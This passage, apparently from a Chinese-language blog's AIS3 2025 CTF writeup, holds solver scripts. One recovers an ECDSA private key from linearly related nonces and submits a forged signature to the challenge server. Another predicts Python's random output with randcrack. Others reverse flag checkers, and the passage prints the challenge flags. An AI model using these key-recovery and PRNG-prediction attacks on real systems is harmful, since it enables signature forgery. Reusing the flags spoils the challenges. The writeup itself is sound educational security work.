+            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 簽名 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>: r=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(r)}</span>, s=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(sig_s)}</span>"</span>)
+        
+        r1, s1 = signatures[<span class="hljs-number">0</span>]
+        r2, s2 = signatures[<span class="hljs-number">1</span>]
+        
+        <span class="hljs-comment"># 訊息雜湊</span>
+        h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(<span class="hljs-string">b"example_msg"</span>).digest(), <span class="hljs-string">'big'</span>) % order
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 訊息雜湊: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(h)}</span>"</span>)
+        
+        <span class="hljs-comment"># 核心數學攻擊</span>
+        <span class="hljs-comment"># 已知：s1 = k1^(-1) * (h + r1 * d) mod n</span>
+        <span class="hljs-comment">#      s2 = k2^(-1) * (h + r2 * d) mod n  </span>
+        <span class="hljs-comment">#      k2 = a * k1 + c mod n</span>
+        
+        <span class="hljs-comment"># 重新整理：k1 = (h + r1 * d) * s1^(-1) mod n</span>
+        <span class="hljs-comment">#          k2 = (h + r2 * d) * s2^(-1) mod n</span>
+        
+        <span class="hljs-comment"># 代入 LCG 關係：</span>
+        <span class="hljs-comment"># (h + r2 * d) * s2^(-1) = a * (h + r1 * d) * s1^(-1) + c mod n</span>
+        
+        s1_inv = <span class="hljs-built_in">pow</span>(s1, -<span class="hljs-number">1</span>, order)
+        s2_inv = <span class="hljs-built_in">pow</span>(s2, -<span class="hljs-number">1</span>, order)
+        
+        <span class="hljs-comment"># 展開並解出 d (私鑰)：</span>
+        <span class="hljs-comment"># h * s2^(-1) + r2 * d * s2^(-1) = a * h * s1^(-1) + a * r1 * d * s1^(-1) + c</span>
+        <span class="hljs-comment"># r2 * d * s2^(-1) - a * r1 * d * s1^(-1) = a * h * s1^(-1) + c - h * s2^(-1)</span>
+        <span class="hljs-comment"># d * (r2 * s2^(-1) - a * r1 * s1^(-1)) = a * h * s1^(-1) + c - h * s2^(-1)</span>
+        
+        coeff = (r2 * s2_inv - a * r1 * s1_inv) % order
+        rhs = (a * h * s1_inv + c - h * s2_inv) % order
+        
+        <span class="hljs-keyword">if</span> coeff == <span class="hljs-number">0</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] 係數為 0，無法求解"</span>)
+            <span class="hljs-keyword">return</span>
+        
+        private_key = (rhs * <span class="hljs-built_in">pow</span>(coeff, -<span class="hljs-number">1</span>, order)) % order
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 恢復的私鑰: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(private_key)}</span>"</span>)
+        
+        <span class="hljs-comment"># 驗證並計算 k1</span>
+        k1 = ((h + r1 * private_key) * s1_inv) % order
+        k2 = ((h + r2 * private_key) * s2_inv) % order
+        k2_expected = (a * k1 + c) % order
+        
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k1 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k1)}</span>"</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k2 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k2)}</span>"</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k2 (預期) = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k2_expected)}</span>"</span>)
+        
+        <span class="hljs-keyword">if</span> k2 != k2_expected:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] k 值驗證失敗"</span>)
+            <span class="hljs-keyword">return</span>
+        
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 驗證成功！開始偽造簽名..."</span>)
+        
+        <span class="hljs-comment"># 預測下一個 k</span>
+        k3 = (a * k2 + c) % order
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 預測的 k3 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k3)}</span>"</span>)
+        
+        <span class="hljs-comment"># 偽造 "give_me_flag" 簽名</span>
+        target_msg = <span class="hljs-string">"give_me_flag"</span>
+        target_h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(target_msg.encode()).digest(), <span class="hljs-string">'big'</span>) % order
+        
+        <span class="hljs-comment"># 計算簽名</span>
+        R3 = k3 * curve.generator
+        r3 = R3.x() % order
+        k3_inv = <span class="hljs-built_in">pow</span>(k3, -<span class="hljs-number">1</span>, order)
+        s3 = (k3_inv * (target_h + r3 * private_key)) % order
+        
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 偽造簽名: r=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(r3)}</span>, s=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(s3)}</span>"</span>)
+        
+        <span class="hljs-comment"># 提交簽名</span>
+        s.send(<span class="hljs-string">b"verify\n"</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        
+        s.send(target_msg.encode() + <span class="hljs-string">b"\n"</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        
+        s.send(<span class="hljs-built_in">hex</span>(r3).encode() + <span class="hljs-string">b"\n"</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        
+        s.send(<span class="hljs-built_in">hex</span>(s3).encode() + <span class="hljs-string">b"\n"</span>)
+        result = s.recv(<span class="hljs-number">2048</span>).decode()
+        
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 攻擊結果:"</span>)
+        <span class="hljs-built_in">print</span>(result)
+        
+        <span class="hljs-keyword">if</span> <span class="hljs-string">"flag"</span> <span class="hljs-keyword">in</span> result.lower() <span class="hljs-keyword">or</span> <span class="hljs-string">"ais3"</span> <span class="hljs-keyword">in</span> result.lower():
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 攻擊成功！"</span>)
+        
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] 錯誤: <span class="hljs-subst">{e}</span>"</span>)
+        <span class="hljs-keyword">import</span> traceback
+        traceback.print_exc()
+    <span class="hljs-keyword">finally</span>:
+        s.close()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 數學方法 ECDSA LCG 攻擊 ==="</span>)
+    solve_ecdsa_lcg()</code></pre>
+
+<p>Flag：<code>AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}</code></p>
+<h3 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h3><h4 id="題目-8"><a href="#題目-8" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>I love streaming randomly online!</p>
+<p>Author : Whale120</p>
+</blockquote>
+<h4 id="Writeup-8"><a href="#Writeup-8" class="headerlink" title="Writeup"></a>Writeup</h4><p>POC:</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512
+<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> isqrt
+<span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack
+
+rc = RandCrack()
+
+hashlist = []
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
+    single_byte = <span class="hljs-built_in">bytes</span>([i])
+    hash_value = <span class="hljs-built_in">int</span>.from_bytes(sha512(single_byte).digest())
+    hashlist.append(hash_value)
+
+db_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">"output.txt"</span>, <span class="hljs-string">"r"</span>).readlines()
+
+db = []
+
+<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> db_file:
+    line = line.strip()
+    <span class="hljs-keyword">if</span> line:
+        db.append(<span class="hljs-built_in">int</span>(line, <span class="hljs-number">16</span>))
+
+rb = []
+
+mask = <span class="hljs-number">0xFFFFFFFF</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">80</span>):
+    hb2 = db[i]
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> hashlist:
+        b2 = hb2 ^ j
+        b = isqrt(b2)
+        <span class="hljs-keyword">if</span> b * b == b2:
+            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+                rb.append((b &gt;&gt; (k * <span class="hljs-number">32</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span>)
+            <span class="hljs-keyword">break</span>
+
+rb = rb[-<span class="hljs-number">624</span>:]
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rb:
+    rc.submit(i)
+
+rand81 = rc.predict_getrandbits(<span class="hljs-number">256</span>)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f"The getrandbits(256) of time=81 is : <span class="hljs-subst">{rand81}</span>"</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_str</span>(<span class="hljs-params">num</span>):
+    test_int = num
+    byte_length = (test_int.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>
+    int_to_bytes = test_int.to_bytes(byte_length, <span class="hljs-string">'big'</span>)
+    bytes_to_string = int_to_bytes.decode(<span class="hljs-string">'ascii'</span>, errors=<span class="hljs-string">'ignore'</span>)
+    <span class="hljs-keyword">return</span> bytes_to_string
+
+origin = <span class="hljs-number">0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694</span>
+
+flag = int_to_str(rand81**<span class="hljs-number">2</span> ^ origin)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f"The Flag is : <span class="hljs-subst">{flag}</span>"</span>)</code></pre>
+
+<p>Flag：<code>AIS3{no_more_junks...plz}</code></p>
+<h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="AIS3-Tiny-Server-Reverse"><a href="#AIS3-Tiny-Server-Reverse" class="headerlink" title="AIS3 Tiny Server - Reverse"></a>AIS3 Tiny Server - Reverse</h3><h4 id="題目-9"><a href="#題目-9" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>Find the secret flag checker in the server binary itself and recover the flag.</p>
+<p>The challenge binary is the same across all AIS3 Tiny Server challenges.</p>
+<p>Please download the binary from the “AIS3 Tiny Server - Web / Misc” challenge.</p>
+<p>This challenge doesn’t depend on the “AIS3 Tiny Server - Pwn” and can be solved independently.</p>
+<p>It is recommended to solve this challenge locally.</p>
+<p>Author: pwn2ooown</p>
+</blockquote>
+<h4 id="Writeup-9"><a href="#Writeup-9" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開 IDA 查看字串，找到與 <code>flag</code> 相關的字串</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image21.webp" alt="Screenshot 2025-06-04 at 12.47.57"></p>
+<p>查看在哪個函式中被呼叫</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image22.webp" alt="Screenshot 2025-06-04 at 12.48.05"></p>
+<p>發現是 <code>sub_2110</code> 函式，查看該函式程式邏輯</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image23.webp" alt="Screenshot 2025-06-04 at 15.50.08 Large"></p>
+<p>應該是透過 <code>sub_1E20</code> 函式判斷 Flag，打開來查看</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image24.webp" alt="Screenshot 2025-06-04 at 15.42.57 Large"></p>
+<p>寫程式逆向回去：</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    <span class="hljs-comment">// 原始加密的整數陣列</span>
+    <span class="hljs-type">uint32_t</span> v8[<span class="hljs-number">11</span>] = {
+        <span class="hljs-number">1480073267</span>,  <span class="hljs-comment">// 0x58382033</span>
+        <span class="hljs-number">1197221906</span>,  <span class="hljs-comment">// 0x475C2812</span>
+        <span class="hljs-number">254628393</span>,   <span class="hljs-comment">// 0x0F2E5129</span>
+        <span class="hljs-number">920154</span>,      <span class="hljs-comment">// 0x000E0ADA</span>
+        <span class="hljs-number">1343445007</span>,  <span class="hljs-comment">// 0x5004D70F</span>
+        <span class="hljs-number">874076697</span>,   <span class="hljs-comment">// 0x34196A19</span>
+        <span class="hljs-number">1127428440</span>,  <span class="hljs-comment">// 0x433CB158</span>
+        <span class="hljs-number">1510228243</span>,  <span class="hljs-comment">// 0x59F67413</span>
+        <span class="hljs-number">743978009</span>,   <span class="hljs-comment">// 0x2C5A2E19</span>
+        <span class="hljs-number">54940467</span>,    <span class="hljs-comment">// 0x03463A33</span>
+        <span class="hljs-number">1246382110</span>   <span class="hljs-comment">// 0x4A4F541E</span>
+    };
+    
+    <span class="hljs-comment">// 密鑰字符串</span>
+    <span class="hljs-type">char</span> key[] = <span class="hljs-string">"rikki_l0v3"</span>;
+    
+    <span class="hljs-comment">// 將整數陣列轉換為字節陣列 (小端序)</span>
+    <span class="hljs-type">uint8_t</span> *v8_bytes = (<span class="hljs-type">uint8_t</span> *)v8;
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"=== AIS3 Flag Decryption PoC ===\n\n"</span>);
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"原始加密資料 (前20字節):\n"</span>);
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0x%02X "</span>, v8_bytes[i]);
+        <span class="hljs-keyword">if</span> ((i + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"使用密鑰: %s\n\n"</span>, key);
+    
+    <span class="hljs-comment">// 解密過程</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1 = <span class="hljs-number">0</span>;
+    <span class="hljs-type">uint8_t</span> v2 = <span class="hljs-number">51</span>;   <span class="hljs-comment">// 初始值</span>
+    <span class="hljs-type">uint8_t</span> v3 = <span class="hljs-number">114</span>;  <span class="hljs-comment">// 初始值</span>
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"開始解密過程...\n"</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"初始: v2=%d, v3=%d\n\n"</span>, v2, v3);
+    
+    <span class="hljs-comment">// 模擬原始的解密循環</span>
+    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+        <span class="hljs-comment">// XOR 解密</span>
+        v8_bytes[v1] = v2 ^ v3;
+        
+        <span class="hljs-keyword">if</span> (v1 &lt; <span class="hljs-number">10</span>) {  <span class="hljs-comment">// 只顯示前10步的詳細過程</span>
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"步驟 %2d: %3d ^ %3d = %3d ('%c')\n"</span>, 
+                   v1 + <span class="hljs-number">1</span>, v2, v3, v8_bytes[v1], 
+                   (v8_bytes[v1] &gt;= <span class="hljs-number">32</span> &amp;&amp; v8_bytes[v1] &lt;= <span class="hljs-number">126</span>) ? v8_bytes[v1] : <span class="hljs-string">'?'</span>);
+        }
+        
+        v1++;
+        <span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">45</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 解密45個字節</span>
+        
+        <span class="hljs-comment">// 更新下一輪的參數</span>
+        v2 = v8_bytes[v1];
+        v3 = key[v1 % <span class="hljs-number">10</span>];
+    }
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"...\n"</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"解密完成！\n\n"</span>);
+    
+    <span class="hljs-comment">// 顯示解密結果</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"解密後的 flag:\n"</span>);
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">45</span>; i++) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v8_bytes[i]);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n\n"</span>);
+    
+    <span class="hljs-comment">// 驗證 flag 格式</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>((<span class="hljs-type">char</span> *)v8_bytes, <span class="hljs-string">"AIS3{"</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ Flag 格式正確 (以 AIS3{ 開頭)\n"</span>);
+        
+        <span class="hljs-comment">// 尋找結尾的 }</span>
+        <span class="hljs-type">int</span> flag_end = <span class="hljs-number">-1</span>;
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">5</span>; i &lt; <span class="hljs-number">45</span>; i++) {
+            <span class="hljs-keyword">if</span> (v8_bytes[i] == <span class="hljs-string">'}'</span>) {
+                flag_end = i;
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+        
+        <span class="hljs-keyword">if</span> (flag_end != <span class="hljs-number">-1</span>) {
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ 找到結尾符號 } 在位置 %d\n"</span>, flag_end);
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ Flag 長度: %d 字符\n"</span>, flag_end + <span class="hljs-number">1</span>);
+            
+            <span class="hljs-comment">// 輸出完整的 flag</span>
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n=== 最終 FLAG ===\n"</span>);
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= flag_end; i++) {
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v8_bytes[i]);
+            }
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n==================\n"</span>);
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✗ 未找到結尾符號 }\n"</span>);
+        }
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✗ Flag 格式不正確\n"</span>);
+    }
+    
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+
+<p>Flag：<code>AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}</code></p>
+<h3 id="web-flag-checker"><a href="#web-flag-checker" class="headerlink" title="web flag checker"></a>web flag checker</h3><h4 id="題目-10"><a href="#題目-10" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>Just a web flag checker</p>
+<p><a target="_blank" rel="noopener" href="http://chals1.ais3.org:29998/">http://chals1.ais3.org:29998</a></p>
+<p>Author: Chumy</p>
+</blockquote>
+<h4 id="Writeup-10"><a href="#Writeup-10" class="headerlink" title="Writeup"></a>Writeup</h4><p>POC：</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-string">"""</span>
+<span class="hljs-string">Simple WebAssembly Flag Extractor</span>
+<span class="hljs-string">Quick solution for AIS3 WASM CTF Challenge</span>
+<span class="hljs-string">"""</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">wasm_flag_extractor</span>():
+    <span class="hljs-string">"""Extract flag from WebAssembly challenge"""</span>
+    
+    <span class="hljs-comment"># Encrypted values from WASM analysis (corrected unsigned conversion)</span>
+    encrypted_signed = [
+        <span class="hljs-number">7577352992956835434</span>,
+        <span class="hljs-number">7148661717033493303</span>,
+        -<span class="hljs-number">7081446828746089091</span>,  <span class="hljs-comment"># This was the error - need proper conversion</span>
+        -<span class="hljs-number">7479441386887439825</span>,  <span class="hljs-comment"># This was also wrong</span>
+        <span class="hljs-number">8046961146294847270</span>
+    ]
+    
+    <span class="hljs-comment"># Convert negative values to unsigned 64-bit properly</span>
+    encrypted = []
+    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> encrypted_signed:
+        <span class="hljs-keyword">if</span> val &lt; <span class="hljs-number">0</span>:
+            <span class="hljs-comment"># Proper two's complement conversion to unsigned 64-bit</span>
+            encrypted.append((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) + val)
+        <span class="hljs-keyword">else</span>:
+            encrypted.append(val)
+    
+    <span class="hljs-comment"># Encryption parameters</span>
+    key = <span class="hljs-number">0xFD9EA72D</span>  <span class="hljs-comment"># -39934163 as unsigned</span>
+    rotations = [(key &gt;&gt; (i * <span class="hljs-number">6</span>)) &amp; <span class="hljs-number">63</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]
+    
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"WASM Flag Extractor (Fixed)"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Key: 0x<span class="hljs-subst">{key:08X}</span>"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Rotations: <span class="hljs-subst">{rotations}</span>"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Encrypted values: <span class="hljs-subst">{[<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> encrypted]}</span>"</span>)
+    <span class="hljs-built_in">print</span>()
+    
+    <span class="hljs-comment"># Decrypt and convert to ASCII</span>
+    flag = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">for</span> i, (enc_val, rot) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(encrypted, rotations)):
+        <span class="hljs-comment"># Right rotate to decrypt</span>
+        decrypted = ((enc_val &gt;&gt; rot) | (enc_val &lt;&lt; (<span class="hljs-number">64</span> - rot))) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>
+        
+        <span class="hljs-comment"># Convert to 8 ASCII chars (little-endian)</span>
+        chars = <span class="hljs-string">""</span>
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+            byte_val = (decrypted &gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>
+            chars += <span class="hljs-built_in">chr</span>(byte_val)
+        
+        flag += chars
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Block <span class="hljs-subst">{i}</span>: 0x<span class="hljs-subst">{decrypted:016X}</span> -&gt; '<span class="hljs-subst">{chars}</span>'"</span>)
+    
+    <span class="hljs-built_in">print</span>()
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🎯 FLAG: <span class="hljs-subst">{flag}</span>"</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)
+    
+    <span class="hljs-keyword">return</span> flag
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    wasm_flag_extractor()</code></pre>
+
+<p>Flag：<code>AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}</code></p>
+<h3 id="A-simple-snake-game"><a href="#A-simple-snake-game" class="headerlink" title="A_simple_snake_game"></a>A_simple_snake_game</h3><h4 id="題目-11"><a href="#題目-11" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>Here is A very interesting Snake game. If no one beat this game the world will be destory in 30 seconds. Now, Chenallger , It’s your duty to beat the game, save the world.</p>
+<p>author: Aukro</p>
+</blockquote>
+<h4 id="Writeup-11"><a href="#Writeup-11" class="headerlink" title="Writeup"></a>Writeup</h4><p>在主函式中看到多個函式名稱包含 <code>draw</code> 字串</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image25.webp" alt="Screenshot 2025-06-05 at 00.06.06"></p>
+<p>嘗試搜尋其他與 <code>draw</code> 有關的函式。看到有一個 <code>drawText</code> 函式，看起來就很會畫 Flag</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image26.webp" alt="Screenshot 2025-06-05 at 00.06.19"></p>
+<p>查看程式邏輯，發現一個判斷式，看起來平常都只會執行到 True 的地方，False 的地方應該就和 Flag 脫不了關係</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image27.webp" alt="Screenshot 2025-06-05 at 00.06.40"></p>
+<p>在判斷前下斷點</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image28.webp" alt="Screenshot 2025-06-05 at 00.07.42"></p>
+<p>執行到斷點後使其跳轉至 False 的地方</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image29.webp" alt="Screenshot 2025-06-05 at 00.08.06"></p>
+<p>然後就拿到 Flag 了！</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image30.webp" alt="Screenshot 2025-06-05 at 00.08.29"></p>
+<p>Flag：<code>AIS3{CH3aT_Eng1n3?_Ofcau53_I_bo_1T_by_hAnD}</code></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2025/07/28/2025-WCD/" title="網頁快取利用之技術分析"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 網頁快取利用之技術分析</span></a><a class="button is-default" href="/2025/03/01/2025-Zeroday-c00kie-winter-event/" title="高中職跨校資安社團 社團交流活動舉辦紀錄與心得"><span class="has-text-weight-semibold">Next: 高中職跨校資安社團 社團交流活動舉辦紀錄與心得</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="1PingSun/1PingSun.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/1PingSun"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> 1Ping 2025</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
